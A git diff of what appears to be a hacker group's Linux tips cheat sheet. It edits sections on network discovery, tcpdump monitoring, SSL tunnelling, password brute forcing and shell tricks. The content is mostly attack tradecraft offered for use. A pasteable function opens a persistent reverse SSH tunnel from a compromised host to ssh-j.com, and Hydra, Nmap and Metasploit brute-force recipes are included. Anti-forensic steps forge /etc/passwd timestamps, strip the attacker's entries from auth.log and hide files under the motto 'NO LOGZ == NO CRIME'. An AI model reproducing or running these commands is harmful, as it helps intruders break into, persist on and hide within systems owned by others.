@@ -21,10 +21,9 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [SSH socks5 tunnel](#ssh-socks-tunnel)
    1. [SSH to NATed host](#ssh-j) 
 1. [Network](#network)
-   1. [ARP discover computers on the local network](#net-arp-discover)
-   1. [ICMP discover local network](#net-icmp-discover)
-   1. [Monitor all new TCP connections](#monitor-tcp)
-   1. [Alert on all new TCP connections](#alert-on-connect)
+   1. [Discover hosts](#discover)
+   1. [Tcpdump](#tcpdump)
+   1. [Tunnel and forwarding](#tunnel)
    1. [Find your public IP address](#your-ip)
    1. [Check reachability from around the world](#check-reachable)
    1. [Check Open Ports](#check-open-ports)
@@ -54,8 +53,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [authorized_keys](#backdoor-auth-keys)
    1. [Remote access an entire network](#backdoor-network)
 1. [Shell Hacks](#shell-hacks)
-   1. [Shred files (secure delete)](#shred-erase)
-   1. [Shred files without *shred*](#shred-without-shred)
+   1. [Shred files (secure delete)](#shred)
    1. [Restore the date of a file](#restore-timestamp)
    1. [Clean logfile](#shell-clean-logs)
    1. [Hide files from a User without root privileges](#shell-hide-files)
@@ -283,6 +281,7 @@ The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now con
 
 On the host behind NAT: Create a reverse SSH tunnel to [ssh-j.com](http://ssh-j.com) like so:
 ```sh
+## Cut & Paste on the host behind NAT.
 ssh_j()
 {
 	local pw
@@ -292,9 +291,8 @@ ssh_j()
 	echo -e "To connect to this host: \e[0;36mssh -J ${pw,,}@ssh-j.com ${USER:-root}@${pw,,}\e[0m"
 	ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=30 ${pw,,}@ssh-j.com -N -R ${pw,,}:22:${2:-0}:${3:-22}
 }
-```
-```sh
-ssh_j  # Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected.
+# Generates a random tunnel ID [e.g. 5dmxf27tl4kx] and keeps the tunnel connected.
+ssh_j
 ```
 
 Then use this command from anywhere else in the world to connect as 'root' to '5dmxf27tl4kx' (the host behind the NAT):
@@ -306,42 +304,51 @@ The ssh connection goes via ssh-j.com into the reverse tunnel to the host behind
 ---
 <a id="network"></a>
 ## 3. Network
-<a id="net-arp-discover"></a>
-**3.i. ARP discover computers on the local network**
+<a id="discover"></a>
+**3.i. Discover hosts**
+
 ```sh
+## ARP disocer computers on the local network
 nmap -r -sn -PR 192.168.0.1/24
 ```
-This will Arp-ping all local machines just like *arping*. ARP ping always seems to work and is very stealthy (e.g. does not show up in the target's firewall). However, this command is by far our favourite:
-```sh
-nmap -thc
-```
 
-<a id="net-icmp-discover"></a>
-**3.ii. ICMP discover local network**
-
-...and when we do not have nmap and we can not do broadcast pings (requires root) then we use this:
 ```sh
+## ICMP discover computers on the local netowrk
 for x in `seq 1 254`; do ping -on -c 3 -i 0.1 -W 200 192.168.1.$x | grep 'bytes from' | cut -f4 -d" " | sort -u; done
 ```
 
-<a id="monitor-tcp"></a>
-**3.iii. Monitor all new TCP connections**
+<a id="tcpdump"></a>
+**3.ii. tcpdump**
 
 ```sh
+## Monitor every new TCP connection
 tcpdump -n "tcp[tcpflags] == tcp-syn"
+
+## Play a *bing*-noise for every new SSH connection
+tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
+
+## Ascii output (for all large packets. Change to >40 if no TCP options are used).
+tcpdump -s 2048 -nAq 'tcp and (ip[2:2] > 60)'
 ```
 
-<a id="alert-on-connect"></a>
-**3.iv. Alert on new TCP connections**
-
-Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from the target system (could be an admin!).
+<a id="tunnel"></a>
+**3.iii. Tunnel and forwarding**
 
 ```sh
-tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
+## Connect to SSL (using socat)
+socat stdio openssl-connect:smtp.gmail.com:465
+
+## Connect to SSL (using openssl)
+openssl s_client -connect smtp.gmail.com:465
+```
+
+```sh
+## Bridge TCP to SSL
+socat TCP-LISTEN:25,reuseaddr,fork  openssl-connect:smtp.gmail.com:465
 ```
 
 <a id="your-ip"></a>
-**3.v. Find your public IP address**
+**3.iv. Find your public IP address**
 
 ```sh
 curl ifconfig.me
@@ -353,13 +360,7 @@ Get geolocation information about any IP address:
 
 ```sh
 curl https://ipinfo.io/8.8.8.8 | jq
-```
-
-```
 curl http://ip-api.com/8.8.8.8
-```
-
-```
 curl https://cli.fyi/8.8.8.8
 ```
 
@@ -370,12 +371,12 @@ curl --socks5 localhost:9050 --socks5-hostname localhost:9050 -s https://check.t
 ```
 
 <a id="check-reachable"></a>
-**3.vi. Check reachability from around the world**
+**3.v. Check reachability from around the world**
 
 The fine people at [https://ping.pe/](https://ping.pe/) let you ping/traceroute/mtr/dig/port-check a host from around the world, check TCP ports, resolve a domain name, ...and many other things.
 
 <a id="check-open-ports"></a>
-**3.vii. Check Open Ports on an IP**
+**3.vi. Check Open Ports on an IP**
 
 ```shell
 curl https://internetdb.shodan.io/1.1.1.1
@@ -385,6 +386,15 @@ curl https://internetdb.shodan.io/1.1.1.1
 **3.viii. Brute Force Password Cracking**
 
 (This list is curated by Joey (?))
+
+<a id="gmail"></a>
+<details>
+  <summary>GMail Imbeciles - CLICK HERE</summary>
+
+> You can not brute force GMAIL accounts.  
+> SMTP AUTH/LOGIN IS DISABLED ON GMAIL.  
+> All GMail Brute Force and Password Cracking tools are FAKE.
+</details>
 
 All tools are pre-installed on segfault:
 ```shell
@@ -415,7 +425,7 @@ T="192.168.0.1"
 
 Userful **Nmap** parameters:
 ```shell
---script-args userdb="${ULIST}",passdb="${PLIST}"
+--script-args userdb="${ULIST}",passdb="${PLIST}",brute.firstOnly
 ```
 
 Userful **Ncrack** parameters:
@@ -430,6 +440,7 @@ Userful **Hydra** parameters:
 -l root  # Set username
 -V       # Show each login/password attempt
 -s 31337 # Set port
+-S       # Use SSL
 -f       # Exit after first valid login
 ```
 
@@ -502,6 +513,15 @@ use auxiliary/scanner/vnc/vnc_login
 set rhosts 192.168.0.1
 set pass_file /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
 run
+```
+
+```shell
+## HTML basic auth
+echo admin >user.txt                     # Try only 1 username
+echo -e "blah\naaddd\nfoobar" >pass.txt  # Add some passwords to try. 'aaddd' is the valid one.
+nmap -p80 --script http-brute --script-args \
+   http-brute.hostname=pentesteracademylab.appspot.com,http-brute.path=/lab/webapp/basicauth,userdb=user.txt,passdb=pass.txt,http-brute.method=POST,brute.firstOnly \
+   pentesteracademylab.appspot.com
 ```
 
 ---
@@ -858,16 +878,15 @@ Use -T to use TOR.
 ---
 <a id="shell-hacks"></a>
 ## 7. Shell Hacks
-<a id="shred-erase"></a>
+<a id="shred"></a>
 **7.i. Shred & Erase a file**
 
 ```sh
 shred -z foobar.txt
 ```
 
-<a id="shred-without-shred"></a>
-**7.ii. Shred & Erase without *shred***
 ```sh
+## SHRED without shred command
 shred()
 {
     [[ -z $1 || ! -f "$1" ]] && { echo >&2 "shred [FILE]"; return 255; }
@@ -881,7 +900,7 @@ Note: Or deploy your files in */dev/shm* directory so that no data is written to
 Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.
 
 <a id="restore-timestamp"></a>
-**7.iii. Restore the date of a file**
+**7.ii. Restore the date of a file**
 
 Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)
 
@@ -890,7 +909,7 @@ touch -r /etc/shadow /etc/passwd
 ```
 
 <a id="shell-clean-logs"></a>
-**7.iv. Clear logfile**
+**7.iii. Clear logfile**
 
 This will reset the logfile to 0 without having to restart syslogd etc:
 ```sh
@@ -904,7 +923,7 @@ grep -Fv 'thc.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f
 ```
 
 <a id="shell-hide-files"></a>
-**7.v. Hide files from that User without root privileges**
+**7.iv. Hide files from that User without root privileges**
 
 Our favorite working directory is */dev/shm/*. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.
 
@@ -932,7 +951,7 @@ cd $'\t'
 ```
 
 <a id="linux-info"></a>
-**7.vi. Find out Linux Distro**
+**7.v. Find out Linux Distro**
 
 ```sh
 # Find out Linux Distribution
